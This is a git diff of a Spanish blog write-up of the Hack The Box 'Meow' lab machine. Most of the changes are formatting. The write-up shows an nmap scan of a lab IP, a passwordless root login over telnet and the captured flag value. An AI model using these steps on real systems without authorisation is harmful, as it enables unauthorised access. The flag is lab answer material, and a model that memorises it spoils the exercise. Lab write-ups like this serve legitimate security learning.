@@ -1,6 +1,6 @@
 ---
 layout: single
-title: <span class="htb">Meow - Starting point - Hack The Box</span>
+title: <span class="htb">Meow - <span class="starting_point">Starting point</span> - Hack The Box</span>
 excerpt: "En este post vamos a comenzar con las máquinas del starting point del tier 0, la primera es Meow y será la elegida para este primer write up.
 Me voy a centrar en el proceso de explotación ya que exiten diferentes preguntas las cuales no aportan elementos de valor, en el caso de que sean indispensables
 para llevar acabo la explotación citaré los recursos en el proceso."
@@ -19,25 +19,23 @@ tags:
   - Nmap
 ---
 
-## Descripcion
+## DESCRIPCION
 
 En este post vamos a comenzar con las máquinas del starting point del tier 0, la primera es Meow y será la elegida para este primer write up.
 Me voy a centrar en el proceso de explotación ya que exiten diferentes preguntas las cuales no aportan elementos de valor, en el caso de que sean indispensables
 para llevar acabo la explotación citaré los recursos en el proceso.
 
-## Indice
+## INDICE
 
 - [Escaneo de puertos](#escaneo-de-puertos)
 - [Conexión por telnet](#conexion-por-telnet)
 - [Respuestas HTB](#respuestas)
 
-## Escaneo de puertos
+## ESCANEO DE PUERTOS
 
 Vamos a lanzar un escaneo básico para encontrar los puertos abiertos en la máquina.
 
-### Nmap para encontrar puertos abiertos
-
-```
+```zsh
 nmap --open -p- 10.129.74.180 -T5 -oG Puertos
 Host: 10.129.74.180 ()  Status: Up
 Host: 10.129.74.180 ()  Ports: 23/open/tcp//telnet///
@@ -46,8 +44,7 @@ Host: 10.129.74.180 ()  Ports: 23/open/tcp//telnet///
 
 Podemos ver que el protocolo telnet esta abierto, lanzaremos los scripts predeterminados de nmap al puerto 23.
 
-### Nmap con scripts de reconocimiento predeterminados
-```
+```zsh
 nmap -sCV -p 23 -oN Objetivos 10.129.1.17
 Nmap scan report for 10.129.1.17
 Host is up (0.047s latency).
@@ -61,11 +58,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Por lo que se puede ver es una máquina linux, pero no obtenemos demasiada información, al no encontrar más puertos por los que intentar comprometer el host, podemos proceder a logueranos
 por telnet.
 
-## Conexion por telnet
+## CONEXION POR TELNET
 
 Intentamos conectarnos con `Usuario:root`.
 
-```
+```zsh
 ❯ telnet 10.129.1.17
 Trying 10.129.1.17...
 Connected to 10.129.1.17.
@@ -113,7 +110,7 @@ root@Meow:~#
 
 Por un error de configuración el usuario root no tiene contraseña dando acceso a la máquina de forma instantánea. Siendo root solo nos queda buscar la flag.
 
-```
+```zsh
 root@Meow:~# pwd
 /root
 root@Meow:~# ls
@@ -124,7 +121,7 @@ b40abdfe23665f766f9c61ecba8a4c19
 ```
 Hemos explotado la primera máquina del starting point tier 0 con èxito. 
 
-## Respuestas
+## RESPUESTAS
 
 ### Pregunta 1
 
